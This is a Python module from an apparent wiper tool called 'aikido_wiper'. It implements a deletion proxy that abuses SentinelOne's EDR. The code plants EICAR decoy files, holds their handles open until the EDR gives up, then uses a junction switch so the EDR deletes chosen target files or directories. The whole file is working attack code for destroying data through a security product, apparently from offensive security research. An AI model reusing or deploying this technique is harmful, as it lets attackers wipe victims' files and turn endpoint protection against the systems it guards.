import os
import win32file
import time

from aikido_wiper.indirect_ops.delete.junction_switch_proxy import JunctionSwitchDeleteProxy, DecoyPath

class SentinelOneDeleteProxy(JunctionSwitchDeleteProxy):
    """
    A deletion proxy that uses Sentinel One's EDR in order to delete files or directories.
    """

    def __init__(self, decoy_dir_path: str) -> None:
        """
        Read parent class doc.
        Also, uses one junction dir for all decoys.
        """
        super().__init__(use_one_junction_dir=True, decoy_dir_path=decoy_dir_path)
        self.__target_paths_to_open_handles = {}
        self.__wait_for_edr_happened = False

    def _create_decoy_file(self, decoy_path: DecoyPath) -> None:
        """
        Read parent class doc.
        Also, after creating the decoy file, closes and opens the file again so the EDR will detect it. The handle
        to it is left open and stored so it can be closed later.
        """
        eicar_file_path = os.path.join(decoy_path.decoy_deepest_dir, os.path.basename(decoy_path.path_to_delete))
        eicar_file_handle = win32file.CreateFile(eicar_file_path,  win32file.GENERIC_READ | win32file.GENERIC_WRITE, win32file.FILE_SHARE_READ, None, win32file.CREATE_NEW, 0, 0)
        win32file.WriteFile(eicar_file_handle, self._get_decoded_eicar(), None)
        win32file.CloseHandle(eicar_file_handle)
        eicar_file_handle = win32file.CreateFile(eicar_file_path,  win32file.GENERIC_READ | win32file.GENERIC_WRITE, win32file.FILE_SHARE_READ, None, win32file.OPEN_EXISTING, 0, 0)

        self.__target_paths_to_open_handles[decoy_path.path_to_delete] = eicar_file_handle

    def _before_junction_switch(self, decoy_path: DecoyPath) -> None:
        """
        Read parent doc.
        Also, waits for the EDR to detect all the files only if it's the first time the callback was called for a set
        of paths to delete. The EDR should try to delete them and give up. After the EDR gave up, The function
        closes the handle to the decoy file which was left open.
        """
        if not self.__wait_for_edr_happened:
            self.__wait_for_edr_happened = True
            print("Waiting 15 seconds")
            time.sleep(15)

        win32file.CloseHandle(self.__target_paths_to_open_handles[decoy_path.path_to_delete])
        self.__target_paths_to_open_handles.pop(decoy_path.path_to_delete)

    def _after_junction_switch(self, decoy_path: DecoyPath) -> None:
        self.__wait_for_edr_happened = False
